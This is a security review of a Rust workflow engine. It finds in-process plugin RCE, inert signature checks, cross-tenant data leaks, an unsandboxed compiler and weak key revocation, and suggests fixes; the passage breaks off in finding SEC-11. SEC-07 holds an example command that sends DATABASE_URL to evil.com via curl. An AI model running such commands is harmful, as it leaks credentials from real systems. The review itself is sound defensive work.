# Security Review

## Summary

Cloacina is honest about its threat surface in places — Postgres identifier validation has its own module with thorough SQL-injection unit tests; bootstrap admin keys are written 0600 with the plaintext never logged; package signatures use Ed25519 with AES-256-GCM at-rest encryption of signing keys; the WebSocket auth path has a single-use ticket store specifically because long-lived API keys shouldn't appear in URLs; and the HTTP server explicitly warns at startup that it has no TLS and must be run behind a terminating proxy. The system has thought carefully about a number of *narrow* surfaces, and where it has thought about them it has done good work.

What it has *not* thought carefully about is the **whole multi-tenant story**. The server's stated isolation model is "Postgres schema search_path per tenant DB pool", but (a) `get_connection_with_schema` silently swallows `SET search_path` errors (correctness already flagged this as `COR-01`), (b) the `triggers` HTTP routes call `state.database` (admin schema) instead of the per-tenant DB despite checking `can_access_tenant`, (c) `executions::execute_workflow` runs every tenant's workflow through the admin runner that's connected to the public schema, (d) the graph health endpoints (`/v1/health/accumulators|graphs`) require auth but do *no* tenant scoping at all — every authenticated key sees every tenant's accumulator and reactor names. The signature-verification surface ships in a configuration that cannot be activated: `SecurityConfig.verification_org_id` has no CLI/config way to set it, so `--require-signatures=true` always fails-closed and rejects all uploads. The `cloacina-compiler` invokes `cargo build` on attacker-supplied source with **no timeout, no rlimit, no sandbox, no network restriction** — `build.rs` arbitrary code execution is the design.

Plugin loading is the system's biggest standing RCE surface. `.cloacina` packages are dlopen'd into the host's process by `fidius-host::loader::load_library`; the cdylib then runs arbitrary native code with the host process's UID. The signing/verification path *exists* but is end-to-end inert in the default `cloacina-server` build: the upload handler only verifies if `require_signatures` is on and `verification_org_id` is set, and neither is reachable through the supplied CLI surface. The `register_workflow_package` lower path used by `cloacinactl daemon` does not call `verify_package_bytes` at all. So today, on the default config, anyone with a tenant-scoped write key can upload a `.cloacina` package containing arbitrary native code that executes in-process with full host filesystem and database access. The trust-chain integration tests that would prove this *intended* posture are six `todo!()` stubs marked `#[ignore = "Requires database connection"]` (already noted as `COR-15`). The audit-logging primitives exist — `audit::log_package_load_success`/`log_package_load_failure` are defined — but **never called from production code**, so a successful exploit leaves no security event trail.

Net assessment: cryptographic primitives are sound, validation routines for primary identifiers exist and are well-tested, but the surface area between "we have a verifier" and "the verifier runs on every dangerous operation" is wide open. This is a system whose security posture is best described as "trustworthy operators inside a trusted network." Deployments outside that envelope need significant additional defense work before a `.cloacina` upload endpoint is safe to expose to untrusted principals.

## Trust Boundary Map

```


       UNTRUSTED                          BOUNDARY                          TRUSTED
       ─────────                          ────────                          ───────

       HTTP client      ───────►     /v1/* routes (auth      ───────►   AppState handlers
       (Bearer token)                middleware: bearer
                                     header → SHA-256 →
                                     LRU/30s → DAL
                                     → AuthenticatedKey)

       WebSocket        ───────►     /v1/ws/* (header        ───────►   accumulator/reactor
       client           (ticket      Bearer OR query                    channels (in-process)
       (ticket or       OR Bearer)   ticket → AuthenticatedKey
        Bearer)                      → per-endpoint policy)

       Multipart        ───────►     POST /tenants/.../      ───────►   WorkflowRegistryImpl
       binary blob                   workflows                          (bzip2 unpack →
       (.cloacina                    (multipart → bytes →                content_hash → DB
        bzip2 source)                100MB body limit →                  store; queues for
                                     [optional sig verify                 build)
                                     fail-closed if
                                     org_id missing])

       Untrusted        ───────►     cloacina-compiler       ===========> cargo build (NO
       Cargo source                  build.rs (claim →                    sandbox, no timeout,
       (build.rs +                   write archive →                      full network, full
        Cargo.toml +                 unpack → cargo →                     filesystem of
        src/*.rs)                    extract cdylib)                      compiler service)

       Untrusted        ───────►     RegistryReconciler      ===========> dlopen via
       cdylib bytes                  load_package (write                  fidius-host (NO
                                     temp file → fidius                   verification by
                                     dlopen → call methods                default; runs
                                     [no signature check])                 in-process as
                                                                          host UID)

       Untrusted        ───────►     cloacina-python         ===========> Python interpreter
       Python source                 import_and_register_                 (CPython,
       (workflow                     python_workflow                       sys.path += workflow,
        directory)                   (validate_no_stdlib                  imports user code)
                                     [shallow check] →
                                     PyO3 import)

       Tenant string    ───────►     Database::try_new_with_  ───────►   Postgres pool with
       (path param)                  schema (validate_                    SET search_path TO
                                     schema_name)                         {tenant}, public
                                                                          (silent fall-through
                                                                          on SET failure —
                                                                          COR-01)

                              [Trusted side: same process UID, same DB credentials,
                              same filesystem; no isolation between tenants
                              other than search_path]
```

Notable boundary characteristics:

- Nothing in cloacina runs unprivileged or sandboxed; trust boundaries are above the engine, not below it.
- The plugin-load and compile paths are the largest gaps — once a `.cloacina` is in the registry, the **entire** trust gate is signature verification (off by default, and inert in the default config — see SEC-04).
- The "tenant" axis is enforced exclusively by Postgres `search_path`. There is no tenant binding on signing org_id, on workflow_packages.tenant_id (always `None`), or on signature storage.
- The `cloacina-server` always uses `state.database` (the public/admin pool) for many handler paths; tenant DB resolution is implemented but inconsistently applied (SEC-02).

## Threat Model Observations

1. **Malicious-package RCE through default config.** An attacker with a tenant-scoped `write` key uploads `evil.cloacina`. The compiler service builds it (running attacker `build.rs` with full network and filesystem access on the build host), the reconciler dlopens the resulting cdylib in the server process, the cdylib's `pre_main` runs as the server's UID. Default deployment has no signature verification because `verification_org_id` cannot be set. **Severity: Critical** (SEC-01, SEC-04).

2. **Tenant-A reads tenant-B's triggers via `state.database`.** A tenant-A key calls `GET /v1/tenants/tenant_a/triggers` — handler authorizes the URL tenant correctly but then queries `state.database` (admin schema), returning ALL schedule rows in the admin schema regardless of the URL `tenant_id`. The data shown belongs to whichever schema `state.database` resolves into, not tenant-A. **Severity: Major** (SEC-02).

3. **Tenant-A executes workflows in the admin schema.** A tenant-A `write` key calls `POST /v1/tenants/tenant_a/workflows/foo/execute`. The handler checks `can_access_tenant`, then calls `state.runner.execute_async(...)` — which uses the runner's own connection pool tied to the public/admin schema. The execution lands in the wrong schema, may step on cross-tenant rows, and the tenant DB is ignored. (Comment in `executions.rs:43-49` says "Full multi-tenant execute_workflow requires per-tenant runners or a runner that accepts a Database override" — the gap is acknowledged but not closed.) **Severity: Major** (SEC-03).

4. **Cross-tenant enumeration via /v1/health/*.** Any authenticated key (no tenant check) can call `GET /v1/health/accumulators`, `/v1/health/graphs`, `/v1/health/graphs/{name}` and learn every reactor and accumulator name across all tenants — an information-disclosure vector that's also a privilege-escalation aid (knowing names is the prerequisite for many follow-ons). **Severity: Major** (SEC-05).

5. **Schema-set silent fallback (COR-01) → cross-tenant query disclosure.** Already in correctness: any transient error from `SET search_path` returns a connection in whatever schema state it last had. Two consecutive tenant queries on the same recycled connection can return tenant-A rows for a tenant-B request. Severity: Critical when triggered, low base rate. (Reference: COR-01.)

6. **WebSocket message floods bypass auth-cache size limit (256 entries).** Auth cache holds 256 keys with 30s TTL. An attacker with 257 valid (revoked) keys cycling them faster than 30s defeats cache hits and forces a DB query per validate. This is a DoS amplification, not data leak. Combine with the lack of HTTP rate limiting (`tower-http` `limit` feature is in Cargo.toml but no rate limiter is wired) for an effective DoS pathway. **Severity: Minor** (SEC-12).

7. **Compiler is a build-side RCE.** The compiler service runs `cargo build` on attacker-supplied source. `build.rs` has full process privileges, full network access, full filesystem access. It can exfiltrate the compiler service's `DATABASE_URL` (passed via env), copy `~/.cargo/credentials.toml`, run `curl` against internal services, etc. No timeout, no rlimit, no namespace, no jail. Mitigated only by the deployment running the compiler on a dedicated host with restricted network egress — but that's a deployment recommendation, not a code property. **Severity: Critical** (SEC-06).

8. **Bootstrap-admin auto-promotion via key name.** Migration `019_add_tenant_and_admin_to_api_keys` runs `UPDATE api_keys SET is_admin = TRUE WHERE name = 'bootstrap-admin'`. If a tenant pre-creates a key named `bootstrap-admin` before the migration runs, that key becomes a god-mode key on migration. One-time only, but worth pinning down — preferably by filtering on `tenant_id IS NULL AND name = 'bootstrap-admin'` rather than name alone. **Severity: Minor** (SEC-09).

9. **Last-admin-key revocation lockout.** `revoke_key` lets any admin (including god-mode admins) revoke any other admin's key with no "you cannot revoke your own only-admin status" guard. Two-admin race where both revoke each other simultaneously, or an attacker who steals one god-mode key and revokes the rest, can lock the operator out of their own admin surface. Recovery requires direct DB intervention. **Severity: Minor** (SEC-10).

10. **Cache-revocation propagation lag in multi-server deployments.** Each `cloacina-server` instance has its own in-memory `KeyCache`. `revoke_key` calls `state.key_cache.clear().await` on the local instance only. In a load-balanced deployment, server B continues to authenticate the revoked key for up to 30s. Already noted in correctness `COR-12`; security re-flags because it's the kind of "we revoked, why is it still working" gap that breaks security expectations. (Cross-reference COR-12.) **Severity: Minor**.

## Findings

### SEC-01: Plugin loading executes arbitrary native code in-process; signature verification is off by default and the `daemon` path never verifies

**Severity**: Critical
**Location**: `crates/cloacina/src/registry/reconciler/loading.rs:70-98`; `crates/cloacina/src/registry/loader/package_loader.rs`; `crates/cloacina/src/registry/workflow_registry/mod.rs:250-341`; `crates/cloacina-server/src/routes/workflows.rs:59-129`
**Confidence**: High

#### Description

Cloacina's `.cloacina` package format is a bzip2 source archive that the compiler service builds into a Rust cdylib. The reconciler loads that cdylib via `fidius_host::loader::load_library(temp_path)` (`loading.rs:83`) — a `dlopen`. Once loaded, the cdylib runs in the host process, can access the host's address space, file descriptors, memory, and any state the runtime exposes. There is no sandbox, no namespace, no syscall filter, no isolation. **A malicious cdylib loaded into `cloacina-server` runs as the server's UID with full Postgres credentials.**

The defense intended for this is package signing. `verify_package_bytes` checks an Ed25519 signature against an org-scoped trusted-key list before load. But this defense is gated on `state.security_config.require_signatures && verification_org_id.is_some()` (`workflows.rs:72`). The server CLI does not expose a way to set `verification_org_id` — `grep -rn verification_org_id crates/cloacina-server` finds zero call sites that mutate `SecurityConfig::verification_org_id` from `None` (the default). So `require_signatures = true` is unreachable in practice; if it were reachable, all uploads would fail-closed because the org binding isn't configured. (See SEC-04 for the configuration gap.)

The lower-level path through `WorkflowRegistryImpl::register_workflow` (`workflow_registry/mod.rs:250`) — used by `cloacinactl daemon` and tests — calls `register_workflow` directly and **never** invokes `verify_package_bytes`. The audit functions `audit::log_package_load_success`/`log_package_load_failure` are defined in `crates/cloacina/src/security/audit.rs:188,207` but never called from any package-loading code path (verified via `grep -rn "audit::log_package_load"` — only test-mod hits).

#### Evidence

- `crates/cloacina/src/registry/reconciler/loading.rs:70-98` — `load_plugin_handle_from_bytes` writes attacker-supplied bytes to a temp file, calls `fidius_host::loader::load_library`, leaks the tempdir. No verification, no signature check.
- `crates/cloacina-server/src/routes/workflows.rs:72-129` — verification only fires when `require_signatures && verification_org_id.is_some()`. Note `crates/cloacina-server/src/lib.rs:263-266` constructs `SecurityConfig { require_signatures, ..SecurityConfig::default() }` — `verification_org_id` is `None` because there's no CLI flag for it.
- `crates/cloacina/src/registry/workflow_registry/mod.rs:250-341` — `WorkflowRegistry::register_workflow` does manifest unpack and content-hash dedup, but no signature check. Used by daemon and direct DB-backed registration.
- `crates/cloacina/src/security/audit.rs:188-207` — `log_package_load_success` and `log_package_load_failure` defined but never called from production code. After a hypothetical compromise the only post-mortem trail would be tracing `info!` lines in the upload route.

#### Suggested Resolution

1. **Make signature verification the default-on path** for any deployment with multi-tenant or untrusted-author scope. Two options:
   - Move verification into `WorkflowRegistry::register_workflow` itself so every register-package code path enforces it, with a builder-time `allow_unsigned: bool` opt-out gated on a `single_tenant_local_dev` mode.
   - Or, push verification into `RegistryReconciler::load_package` so even legacy upload paths (daemon, etc.) get verified before dlopen.
2. **Wire `verification_org_id` to a CLI flag** (`--verification-org-id <UUID>`) and require it when `--require-signatures` is set. Document the org-creation flow.
3. **Call `audit::log_package_load_*`** from the load path on both success and failure. Without it, an exploited cdylib leaves no security event for forensics.
4. Consider a `LD_AUDIT`-style hook before `dlopen` that captures the cdylib SHA-256 and refuses load if it doesn't match a previously-verified hash. The build path could record the post-build hash against the package row.

**Cross-cutting note**: This is closely tied to `COR-15` (signing tests are `#[ignore]`-gated TODOs) and to the `fidius` ABI commitment. If the project intends to support arbitrary third-party packages, the signature path is load-bearing and needs to be exercised end-to-end by the test suite.

---

### SEC-02: `triggers.rs` uses `state.database` (admin pool) regardless of tenant — tenant-A queries reveal admin-schema data

**Severity**: Major
**Location**: `crates/cloacina-server/src/routes/triggers.rs:40, 84`
**Confidence**: High

#### Description

`list_triggers` and `get_trigger` both compare:

```rust
if !auth.can_access_tenant(&tenant_id) {
    return AuthenticatedKey::forbidden_response().into_response();
}
let dal = cloacina::dal::DAL::new(state.database.clone());  // ← admin DB, not tenant DB
match dal.schedule().list(...).await { ... }
```

The DAL is constructed with `state.database` — the server-wide `Database` connected to the public/admin schema, *not* the tenant's per-schema `Database`. Compared with `executions::list_executions`/`get_execution`/`get_execution_events`, which correctly use `state.tenant_databases.resolve(&tenant_id, &state.database)`, this is an inconsistency in the same file family. A tenant-A key passes `can_access_tenant` for `tenant_a`, but the data returned is from the admin schema — exposing all tenants' triggers (since the admin schema is shared infrastructure where the server itself stores some entities).

The test suite (`crates/cloacina-server/src/lib.rs:1611-1644`) only asserts `200 OK` and `body["schedules"].as_array().is_some()` — never that the returned data corresponds to the requested tenant. So the bug ships green.

#### Evidence

- `crates/cloacina-server/src/routes/triggers.rs:40` — `let dal = cloacina::dal::DAL::new(state.database.clone());` (no `tenant_databases.resolve`).
- `crates/cloacina-server/src/routes/triggers.rs:84` — same pattern in `get_trigger`.
- Compare `crates/cloacina-server/src/routes/executions.rs:111-120` — correct pattern.
- `crates/cloacina/src/dal/unified/schedule/mod.rs:62-78` — `list` does not filter by tenant_id; relies entirely on connection-level schema isolation.

#### Suggested Resolution

Mirror the `executions.rs` pattern:

```rust
let tenant_db = match state.tenant_databases.resolve(&tenant_id, &state.database).await {
    Ok(db) => db,
    Err(e) => return ApiError::internal(format!("tenant database error: {}", e)).into_response(),
};
let dal = cloacina::dal::DAL::new(tenant_db);
```

Add a regression test that calls `list_triggers` for one tenant and asserts that schedules created in another tenant's schema do not appear.

---

### SEC-03: `execute_workflow` runs every tenant's workflow on the shared admin runner — workflows execute in the wrong schema

**Severity**: Major
**Location**: `crates/cloacina-server/src/routes/executions.rs:50-99`; `crates/cloacina-server/src/lib.rs:97-109` (AppState)
**Confidence**: High

#### Description

`execute_workflow` checks tenant access, then calls `state.runner.execute_async(&name, context)`. The `runner` is `Arc<DefaultRunner>`, constructed once at server startup with a single `Database` pointing at the public/admin schema (`crates/cloacina-server/src/lib.rs:241-243`). Regardless of which tenant the URL specifies, the workflow gets scheduled into `workflow_executions` of the admin schema, not the tenant's schema.

The TODO at `executions.rs:43-49` acknowledges this:

> NOTE: Execution is scheduled through the shared DefaultRunner, which uses its own database connection. ... Full multi-tenant execute_workflow requires per-tenant runners or a runner that accepts a Database override.

This is a tenant-isolation breach disguised as a feature gap — it isn't merely "workflows aren't isolated yet"; it's that execution rows from tenant A are co-located with tenant B in admin space. Any tenant `read` key can list those rows via `executions::list_executions` (which DOES use the tenant DB and therefore won't see them, but they ARE visible from any admin-credential query path on `state.database`).

Worse: the `RegistryReconciler` is also bound to the runner's DB. So packages uploaded to tenant-A schemas are never reconciled into the runner; the runner can only execute workflows registered in the admin schema. Effectively the server's execute path **only works for workflows in the admin schema**, and any tenant-scoped upload simulates execution by leaving rows in the wrong place.

#### Evidence

- `crates/cloacina-server/src/lib.rs:241-243` — runner constructed once with admin URL.
- `crates/cloacina-server/src/lib.rs:97-109` — AppState carries `runner: Arc<DefaultRunner>` and `tenant_databases: Arc<TenantDatabaseCache>` separately; the dual model is by design.
- `crates/cloacina-server/src/routes/executions.rs:74` — `state.runner.execute_async(...)` always uses the admin runner.
- `crates/cloacina-server/src/routes/executions.rs:43-49` — TODO comment.

#### Suggested Resolution

Two options (also raised in `EVO-04`):

1. **Per-tenant runner cache** — extend `TenantDatabaseCache` to a `TenantRunnerCache` keyed by tenant. Each tenant gets a `DefaultRunner` bound to its DB. Memory cost is real; cache eviction logic needed.
2. **Database-override on execute** — extend `WorkflowExecutor::execute_async` to accept a `Database` override so the runner's scheduler/dispatcher use the right pool. Requires the runner's per-tenant state to be addressable per-call (today the runner is Arc-shared and stateful).

Either works; the current state is a clear cross-tenant misrouting. Until fixed, document that `execute_workflow` is "single-tenant only" and disable the route in multi-tenant deployments.

**Cross-cutting note**: Evolvability flagged this as `EVO-04`; security re-flags because the consequence is a tenant boundary breach.

---

### SEC-04: `verification_org_id` is unreachable from the server CLI; `--require-signatures` always fails-closed

**Severity**: Major
**Location**: `crates/cloacina-server/src/lib.rs:263-266`; `crates/cloacina-server/src/main.rs` (no flag); `crates/cloacina/src/security/verification.rs:51-58`
**Confidence**: High

#### Description

`SecurityConfig::verification_org_id: Option<UniversalUuid>` is the binding between "this server's signature verifier" and "the trusted-key list to verify against." `cloacina-server` constructs its `SecurityConfig` as:

```rust
security_config: SecurityConfig {
    require_signatures,
    ..SecurityConfig::default()  // verification_org_id: None
},
```

There is no CLI flag, environment variable, or config-file support to set `verification_org_id`. As a result, the upload handler's verification block (`workflows.rs:72-86`) either:

- `require_signatures = false` (default) — verification entirely skipped (SEC-01).
- `require_signatures = true` AND `verification_org_id = None` — handler returns `403 signature_verification_unconfigured` for every upload (`workflows.rs:74-85`). This is fail-safe but also fail-useless.

The `bootstrap_admin_key` flow creates a god-mode API key, but org IDs in the security model are a separate concept — there's no implicit "default org" tied to bootstrap. So even an operator who reads the docs can't enable signature verification without DB intervention.

#### Evidence

- `crates/cloacina-server/src/lib.rs:263-266` — security_config construction.
- `grep -rn "verification_org_id" crates/cloacina-server` — only the workflows-route reader and the type definition; no setters.
- `crates/cloacina-server/src/main.rs` — no `verification_org_id` argument.
- `crates/cloacina/src/security/verification.rs:51-58` — field doc explicitly notes the fail-safe behavior.

#### Suggested Resolution

Add a `--verification-org-id <UUID>` CLI flag (and matching `CLOACINA_VERIFICATION_ORG_ID` env var) to `cloacina-server`. Either:
- Require it when `--require-signatures` is set; refuse to start otherwise.
- Or auto-create a default org during bootstrap (next to `bootstrap-admin` key creation) and persist its ID to `~/.cloacina/server-config` so subsequent restarts pick it up.

Add a regression test that exercises the full sign → upload → verify → load path against a fixture-trusted key.

---

### SEC-05: Graph health endpoints leak every tenant's accumulator and reactor names to any authenticated key

**Severity**: Major
**Location**: `crates/cloacina-server/src/routes/health_graphs.rs:37-117`; `crates/cloacina-server/src/lib.rs:449-465`
**Confidence**: High

#### Description

The graph health routes (`/v1/health/accumulators`, `/v1/health/graphs`, `/v1/health/graphs/{name}`) are gated only by `require_auth` middleware — they require a valid API key but perform **no tenant scoping**. The handlers iterate `state.endpoint_registry` (which is the global, server-wide accumulator/reactor registry shared across all tenants), serialize every entry's name and health to JSON, and return them.

A tenant-A `read` key calling `GET /v1/health/accumulators` sees:

```json
{
  "accumulators": [
    {"name": "tenant_a.alpha", "status": "live"},
    {"name": "tenant_b.risk_signals", "status": "live"},
    {"name": "tenant_c.kafka_orders", "status": "disconnected"}
  ]
}
```

This is a tenant-name and topology disclosure. For environments where tenant names themselves are sensitive (e.g., a multi-customer SaaS) or where reactor names hint at business logic, this is a significant leak. It's also a privilege-escalation aid — knowing an accumulator name is the prerequisite for guessing the WS endpoint.

#### Evidence

- `crates/cloacina-server/src/lib.rs:449-465` — graph_health_routes only attaches `require_auth`; no per-tenant filtering.
- `crates/cloacina-server/src/routes/health_graphs.rs:37-54` — `list_accumulators` returns every accumulator regardless of caller's tenant.
- `crates/cloacina-server/src/routes/health_graphs.rs:57-81` — `list_graphs` same pattern.
- The `EndpointRegistry` itself supports per-endpoint policies (`crates/cloacina/src/computation_graph/registry.rs:285-343`), but the *list* endpoints don't consult them — only the WS upgrade endpoints do.

#### Suggested Resolution

Filter the health endpoints by the caller's authorized tenant set (or admin god-mode passthrough):

```rust
let accumulators = state.endpoint_registry.list_accumulators_with_health().await;
let visible: Vec<_> = accumulators.into_iter()
    .filter(|(name, _)| auth.is_admin || endpoint_belongs_to_tenant(name, auth.tenant_id.as_deref()))
    .collect();
```

The `endpoint_belongs_to_tenant` check can use the policy already stored in the registry (`AccumulatorAuthPolicy.allowed_tenants`) to decide visibility. Add a `/v1/tenants/{tenant_id}/health/...` route family for explicit tenant-scoped access.

---

### SEC-06: `cloacina-compiler` runs `cargo build` on attacker-supplied source with no timeout, no rlimits, no network restriction, no sandbox

**Severity**: Critical
**Location**: `crates/cloacina-compiler/src/build.rs:131-167`; `crates/cloacina-compiler/src/loopp.rs:36-83`; `crates/cloacina-compiler/src/config.rs:23-58`
**Confidence**: High

#### Description

The compiler service polls `workflow_packages` for `build_status='pending'`, claims a row, downloads the bzip2 source, unpacks to a tempdir, and runs `std::process::Command::new("cargo").args(...).current_dir(source_dir).output()`. The source is attacker-controlled. cargo executes:

- `build.rs` — arbitrary Rust code, full process privileges, full network, full filesystem.
- The crate's source — runs at compile time via `proc_macro` if present.
- Any dependency's `build.rs` from the resolved Cargo.lock.

There is no:
- Timeout on the cargo invocation (no `Command::output()` wrapper, no `kill_on_drop`).
- Resource limit (rlimit, cgroups, prlimit).
- Network restriction (cargo can fetch arbitrary registries; build.rs can curl anything).
- Filesystem jail (cargo writes to the host's `target/`, build.rs can write anywhere).
- User/UID isolation (process runs as the compiler service's UID; reads its env including `DATABASE_URL`).
- No deny-list on Cargo.toml dependency sources.

The compiler service stores its `DATABASE_URL` in env (passed at startup); a malicious `build.rs` can read `std::env::var("DATABASE_URL")` and leak it via outbound HTTP. With that URL it has full read/write access to all tenant data in the cluster.

The default `cargo_flags` are `["build", "--release", "--lib"]` (`main.rs:93-101`); there's no `--offline`, no `--frozen`. A package can therefore add a `[dependencies]` entry pointing at an attacker-controlled git URL, which `cargo build` will dutifully clone and build.

This is **not** a flaw — it's the design as documented. The tradeoff is that the compiler service must run on a dedicated host with restricted egress and reduced privileges. But that's an operator's responsibility, not enforced by the code, and there's no documented hardening guide.

#### Evidence

- `crates/cloacina-compiler/src/build.rs:131-167` — `cargo_build` invocation, no timeout wrapper.
- `crates/cloacina-compiler/src/main.rs:93-101` — default `cargo_flags` lack `--offline`.
- `crates/cloacina-compiler/src/config.rs:23-58` — `CompilerConfig` has no `build_timeout`, no `network_restricted`, no `disable_build_scripts` field.
- `loopp.rs:62` — outcome is awaited synchronously; the heartbeat keeps the row alive but doesn't enforce a wall-clock cap.

#### Suggested Resolution

Defense-in-depth, in order of immediate value:

1. **Wrap `cargo build` in `tokio::time::timeout`** (e.g., 10 minutes default, configurable via `--build-timeout-s`). Currently a runaway `build.rs` will pin the heartbeat indefinitely.
2. **Default `--frozen` and `--offline`** to forbid cargo from fetching new dependencies at build time. Pre-vendor required dependencies into a curated `~/.cargo/registry`. Make off-network the explicit choice.
3. **Document the threat model**: the compiler service MUST run as an unprivileged UID, MUST be on a host with no outbound network beyond what cargo legitimately needs, MUST NOT have any Cloacina admin credentials beyond its own build-claim DB user.
4. **Resource limits**: spawn cargo via a wrapper that calls `setrlimit(RLIMIT_CPU, RLIMIT_AS, RLIMIT_NOFILE, RLIMIT_NPROC)` before exec.
5. **Optional jail**: integrate with `bwrap` (bubblewrap) or `nsjail` so each build runs in an unprivileged namespace with a tmpfs filesystem. This is the right long-term answer.
6. **Add a security-relevant audit log** when builds start/finish, including the Cargo.toml dep-graph hash, so a forensics path exists.

---

### SEC-07: Python loader stdlib deny-list is shallow — only checks immediate filenames in workflow/vendor dirs

**Severity**: Minor
**Location**: `crates/cloacina-python/src/loader.rs:43-69, 193-217`
**Confidence**: High

#### Description

`STDLIB_DENY_LIST` covers `os`, `sys`, `subprocess`, `shutil`, etc. `validate_no_stdlib_shadowing` walks `workflow_dir` and `vendor_dir` with `std::fs::read_dir` (non-recursive) and checks each entry's filename against the list. The intent is to stop a malicious package from shipping `os.py` and shadowing the real stdlib. But:

- Already noted in correctness `COR-17` that nested `mypkg/os.py` slips past the shallow check.
- The deny-list pattern is itself flawed for an adversarial threat model — Python's import machinery has multiple ways to load code (`importlib`, `__import__`, `exec("import os")` from a str literal, dynamic `sys.path` mutation). A package that wants to call `os.system` doesn't need to shadow stdlib; it can just `import os` directly. The check stops accidental name collisions, not adversarial code execution.

After import, the package's code runs in the embedded interpreter with full Python privileges — same UID as the host, same env, same filesystem. There is no Python sandbox. So `os.system("curl evil.com/$DATABASE_URL")` works fine without ever shadowing anything.

So the deny-list is best understood as a hygiene check, not a security boundary.

#### Evidence

- `crates/cloacina-python/src/loader.rs:43-69` — flat list.
- `crates/cloacina-python/src/loader.rs:201-213` — only `std::fs::read_dir` (non-recursive) of two top-level dirs.
- COR-17 already flagged the depth issue.

#### Suggested Resolution

Either (a) make the deny-list recursive AND add a CI lint that validates third-party packages don't import dangerous-by-default modules (essentially impossible in practice), or (b) acknowledge that Python packages **are arbitrary code execution by design** and reposition the deny-list as a typo-prevention check, not a security control.

If the intent is genuine sandboxing, the right answer is RestrictedPython, a separate Python interpreter process with seccomp, or moving Python execution out-of-process entirely. That's a much bigger architectural commitment — flag in the docs that Python tasks today have full host access.

**Cross-cutting note**: cross-references `COR-17`.

---

### SEC-08: API key cache uses `tokio::sync::Mutex` — single-server only; revocation latency 30s in multi-server deployments

**Severity**: Minor
**Location**: `crates/cloacina-server/src/routes/auth.rs:58-117`; `crates/cloacina-server/src/routes/keys.rs:178-192`
**Confidence**: High

#### Description

Already partly noted as `COR-12`. From a security angle:

1. `KeyCache::clear()` is called on revocation but only on the local `Arc<KeyCache>`. Multi-server (load-balanced) deployments have one cache per server; revocation propagates lazily over the 30s TTL. There's no inter-server signal (no Postgres `LISTEN/NOTIFY`, no Redis pub/sub). For a key compromised by exfiltration, the attacker has up to 30s after revocation to keep using it on any server they hadn't already hit.

2. `KeyCache::evict(&hash)` exists but is `#[allow(dead_code)]` — the revocation path uses `clear()` (full cache wipe), which evicts every other tenant's entries in addition to the revoked one. For high-rate auth workloads this is a thundering-herd against the DB.

3. The cache uses `tokio::sync::Mutex<LruCache>` — every cache lookup serializes against every other cache lookup. Already flagged as a perf issue (`PERF-12` per the performance review summary). From a security lens, contention amplifies the cache-defeat DoS surface — an attacker rotating 257+ unique invalid keys forces every legitimate auth through the slow DB path.

#### Evidence

- `crates/cloacina-server/src/routes/keys.rs:181` — `state.key_cache.clear().await` on every revoke.
- `crates/cloacina-server/src/routes/auth.rs:106-110` — `evict` exists but unused, marked `#[allow(dead_code)]`.
- `crates/cloacina-server/src/routes/auth.rs:59` — Mutex, not RwLock.

#### Suggested Resolution

For single-server: switch revocation to `evict(&hash)`. For multi-server: implement Postgres `LISTEN/NOTIFY` on a `key_revoked` channel where every server subscribes and evicts on receive. Cap cache size via deployment config; surface cache-miss rate as a metric.

**Cross-cutting note**: shares ground with `COR-12` and `PERF-12`.

---

### SEC-09: Migration `019` auto-promotes any key named `bootstrap-admin` to god-mode

**Severity**: Minor
**Location**: `crates/cloacina/src/database/migrations/postgres/019_add_tenant_and_admin_to_api_keys/up.sql:5`
**Confidence**: High

#### Description

The migration that introduces the `is_admin` column finalizes with:

```sql
UPDATE api_keys SET is_admin = TRUE WHERE name = 'bootstrap-admin';
```

This works for the intended case (the bootstrap key created by the server at startup is named `bootstrap-admin`). But the filter is on **name only** — no check on `tenant_id IS NULL`, no check on creator. If a tenant ever creates an API key with `name = 'bootstrap-admin'` *before* the migration runs (e.g., during an upgrade window), that tenant key gets promoted to god-mode. After migration, `is_admin = TRUE` is the only flag that gates `create_tenant`, `remove_tenant`, `create_tenant_key`, and god-mode tenant access. A tenant key with this elevation can list and modify all tenants.

The migration runs once per database, so the window is bounded — but the failure mode is silent (no migration warning when promotion occurs to anything other than the canonical bootstrap row), and recovery requires a manual `UPDATE`.

#### Evidence

- `crates/cloacina/src/database/migrations/postgres/019_add_tenant_and_admin_to_api_keys/up.sql:5`
- `crates/cloacina-server/src/lib.rs:631-634` — the bootstrap creation path passes `is_admin=true, "admin"` and writes the plaintext to `~/.cloacina/bootstrap-key`. Only the bootstrap path *creates* a god-mode key in normal operation, but the migration's filter trusts the name alone.

#### Suggested Resolution

Tighten the migration filter: `UPDATE api_keys SET is_admin = TRUE WHERE name = 'bootstrap-admin' AND tenant_id IS NULL`. Add a follow-up migration that rejects (or warns about) any pre-existing `name = 'bootstrap-admin'` rows that don't satisfy the constraint, with operator instructions for resolution.

---

### SEC-10: `revoke_key` allows revoking any key including the last god-mode admin — no anti-lockout guard

**Severity**: Minor
**Location**: `crates/cloacina-server/src/routes/keys.rs:160-192`
**Confidence**: High

#### Description

`revoke_key` checks the caller has `can_admin()` and that the target key UUID parses, then calls `dal.api_keys().revoke_key(id)` which sets `revoked_at = now()`. There is no:

- Check that the caller isn't trying to revoke their own key.
- Check that at least one god-mode admin key remains active.
- Two-key-confirmation for revoking god-mode keys.

A compromised god-mode key can revoke all other god-mode keys, leaving the operator unable to administer the deployment without direct DB access. A two-tenant-admin race can have both delete each other simultaneously.

#### Evidence

- `crates/cloacina-server/src/routes/keys.rs:162-192` — no defensive guards.
- `crates/cloacina/src/dal/unified/api_keys/crud.rs:170-191` — DAL method has no guards either; just `UPDATE api_keys SET revoked_at = now() WHERE id = $1 AND revoked_at IS NULL`.

#### Suggested Resolution

Add at least:

1. **Reject self-revocation** — return 400 if `id == auth.key_id`.
2. **Last-admin guard** — when revoking an `is_admin = true` key, count remaining unrevoked admin keys; refuse if the count would drop to zero.
3. **Document recovery** — make it explicit how to recreate a bootstrap key by direct DB access if all god-mode keys are revoked.

---

### SEC-11: Schedule names, package metadata, and execution_event payloads serialize raw JSON into responses; prompt-injection / cross-tenant log injection surface

**Severity**: Minor
**Location**: `crates/cloacina-server/src/routes/executions.rs:230-249`; `crates/cloacina-server/src/routes/triggers.rs:106-129`
**Confidence**: Medium

#### Description

`get_execution_events` returns event records with `event_data: JSON` passed through directly:

```rust
serde_json::json!({
    "id": ...,
    "event_type": e.event_type,
    "event_data": e.event_data,  // ← raw JSON, no validation
    ...
})
```

